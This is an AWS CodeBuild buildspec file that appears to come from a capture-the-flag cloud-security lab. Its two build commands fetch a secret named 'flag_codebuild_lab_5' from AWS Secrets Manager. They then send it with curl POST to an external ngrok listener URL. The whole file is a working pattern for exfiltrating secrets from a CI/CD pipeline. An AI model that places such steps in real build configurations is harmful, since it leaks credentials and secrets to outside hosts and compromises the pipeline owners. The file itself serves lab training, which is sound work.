version: 0.2

phases:
  build:
    commands:
      # 1. Reach out to AWS Secrets Manager to get the flagg
      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
      
      # 2. Send the flag to your listener
      # Replace <YOUR_URL> with your actual webhook.site or ngrok URL
      - curl -X POST https://ace-balneological-undaintily.ngrok-free.dev --data "flag=$FLAG"
